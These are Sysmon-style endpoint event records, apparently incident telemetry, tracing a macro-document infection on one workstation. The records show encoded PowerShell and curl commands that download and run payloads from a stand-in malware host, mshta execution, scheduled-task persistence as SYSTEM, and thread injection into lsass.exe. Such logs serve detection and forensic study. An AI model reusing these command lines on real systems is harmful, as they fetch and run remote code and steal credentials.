{"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:31:04Z","Image":"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE","CommandLine":"\"WINWORD.EXE\" /n \"C:\\Users\\REDACTED\\Downloads\\REDACTED\"","User":"CORP\\REDACTED","ParentImage":"C:\\Program Files\\Mozilla Firefox\\firefox.exe"}
{"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:31:18Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -ep bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc3RhZ2UyLm1hbHdhcmUtY2RuLmV4YW1wbGUvcGF5bG9hZC5wczEnKQ==","User":"CORP\\REDACTED","ParentImage":"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"}
{"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:33:42Z","Image":"C:\\Windows\\System32\\REDACTED","CommandLine":"REDACTED /c curl -s http://stage2.malware-cdn.example/loader.txt | REDACTED -decode loader.txt loader.hta && mshta.exe loader.hta","User":"CORP\\REDACTED","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
{"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:35:11Z","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /create /sc minute /mo 10 /tn REDACTED /tr \"wscript.exe C:\\ProgramData\\GoogleSync\\sync.vbs\" /ru SYSTEM /f","User":"CORP\\REDACTED","ParentImage":"C:\\Windows\\System32\\REDACTED"}
{"host":"WKSTN-12","EventID":8,"UtcTime":"2026-05-15T08:48:51Z","SourceImage":"C:\\Users\\REDACTED\\AppData\\Local\\Temp\\svc-helper.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","StartAddress":"0x00007FFB12340000","StartFunction":"NtCreateThreadEx"}
